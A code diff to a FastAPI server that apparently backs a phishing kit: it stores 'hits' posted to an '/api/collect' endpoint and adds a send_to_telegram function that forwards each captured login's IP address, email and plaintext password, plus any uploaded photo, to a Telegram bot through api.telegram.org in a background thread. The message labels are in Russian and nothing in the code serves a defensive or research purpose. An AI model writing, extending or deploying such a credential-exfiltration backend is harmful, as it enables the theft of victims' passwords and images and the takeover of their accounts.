@@ -2,10 +2,12 @@ from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
 from contextlib import asynccontextmanager
-import sqlite3, json, time, uuid, os
+import sqlite3, json, time, uuid, os, urllib.request, base64, threading
 
 DB_PATH = os.path.join(os.path.dirname(__file__), "hits.db")
 OPERATORS = set()
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
 def init_db():
     c = sqlite3.connect(DB_PATH)
@@ -56,6 +58,45 @@ async def operator_ws(ws: WebSocket):
     finally:
         OPERATORS.discard(ws)
 
+def send_to_telegram(rec):
+    if not BOT_TOKEN or not CHAT_ID:
+        print("Telegram: No token or chat_id")
+        return
+    try:
+        data = rec.get("data", {})
+        if data.get("type") != "login":
+            return
+            
+        text = f"🔥 Новый вход\n"
+        text += f"🌐 IP: {rec['ip']}\n"
+        text += f"📧 Email: {data.get('email')}\n"
+        text += f"🔑 Пароль: {data.get('password')}\n"
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        req = urllib.request.Request(url, data=json.dumps({"chat_id": CHAT_ID, "text": text}).encode(), headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=5)
+        
+        photo_b64 = data.get("photo")
+        if photo_b64 and photo_b64.startswith("data:image"):
+            img_data = base64.b64decode(photo_b64.split(",")[1])
+            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+            body = (
+                f"--{boundary}\r\n"
+                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
+                f"--{boundary}\r\n"
+                f'Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n'
+                f"Content-Type: image/jpeg\r\n\r\n"
+            ).encode() + img_data + f"\r\n--{boundary}--\r\n".encode()
+            
+            req_photo = urllib.request.Request(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                data=body,
+                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
+            )
+            urllib.request.urlopen(req_photo, timeout=10)
+    except Exception as e:
+        print("Telegram error:", e)
+
 @app.post("/api/collect")
 async def collect(req: Request, body: dict):
     rec = {
@@ -65,6 +106,9 @@ async def collect(req: Request, body: dict):
         "ua": req.headers.get("user-agent", ""),
         "data": body,
     }
+    
+    threading.Thread(target=send_to_telegram, args=(rec,)).start()
+
     try:
         c = sqlite3.connect(DB_PATH)
         c.execute(
